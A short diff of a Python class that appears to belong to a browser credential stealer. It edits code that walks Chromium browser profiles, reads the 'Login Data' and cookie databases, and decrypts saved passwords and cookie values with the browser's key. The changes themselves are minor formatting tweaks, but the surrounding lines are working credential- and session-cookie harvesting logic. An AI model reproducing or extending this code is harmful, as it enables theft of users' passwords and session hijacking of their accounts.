@@ -55,7 +55,6 @@ class browser:
         passwords = []
         for browser_name,browser_path,secret_key in self.browsers:
             try:
-                # passwords += "-"*50 + "\nBROWSER:%s\n"%browser_name + "-"*50
                 folders = [element for element in os.listdir(browser_path) if re.search("^Profile*|^Default$",element)!=None]
                 for folder in folders:
                     chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(browser_path,folder))
@@ -108,9 +107,9 @@ class browser:
                                 decrypted_value = self.__decrypt_data(secret_key, encrypted_value[3:15], encrypted_value[15:-16])
                             else:
                                 decrypted_value = value
-                            creation_utc = self.__get_chrome_datetime(creation_utc)
-                            last_access_utc = self.__get_chrome_datetime(last_access_utc)
-                            expires_utc = self.__get_chrome_datetime(expires_utc)
+                            creation_utc = str(self.__get_chrome_datetime(creation_utc))
+                            last_access_utc = str(self.__get_chrome_datetime(last_access_utc))
+                            expires_utc = str(self.__get_chrome_datetime(expires_utc))
                             cookies.append([browser_name,host_key, name, decrypted_value, creation_utc, last_access_utc, expires_utc])
                         cursor.close()
                         conn.close()
